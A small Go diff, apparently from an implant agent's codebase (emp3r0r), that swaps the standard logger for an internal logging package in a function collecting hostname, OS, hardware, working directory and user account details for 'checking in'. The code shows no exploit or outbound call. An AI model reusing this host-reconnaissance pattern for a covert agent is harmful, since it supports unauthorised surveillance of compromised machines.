@@ -2,7 +2,7 @@ package agentutils
 
 import (
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/user"
 	"runtime"
@@ -19,7 +19,7 @@ import (
 
 // CollectSystemInfo build system info object
 func CollectSystemInfo() *def.Emp3r0rAgent {
-	log.Println("Collecting system info for checking in")
+	logging.Println("Collecting system info for checking in")
 	var info def.Emp3r0rAgent
 	osinfo := sysinfo.GetOSInfo()
 	info.GOOS = runtime.GOOS
@@ -27,17 +27,17 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
-		log.Printf("Gethostname: %v", err)
+		logging.Printf("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
 	// read productInfo
 	info.Product, err = ghw.Product(ghw.WithDisableWarnings())
 	if err != nil {
-		log.Printf("ProductInfo: %v", err)
+		logging.Printf("ProductInfo: %v", err)
 	}
 	info.CWD, err = os.Getwd()
 	if err != nil {
-		log.Printf("Getwd: %v", err)
+		logging.Printf("Getwd: %v", err)
 		info.CWD = "."
 	}
 
@@ -65,7 +65,7 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	// user account info
 	u, err := user.Current()
 	if err != nil {
-		log.Println(err)
+		logging.Println(err)
 		info.User = "Not available"
 	}
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
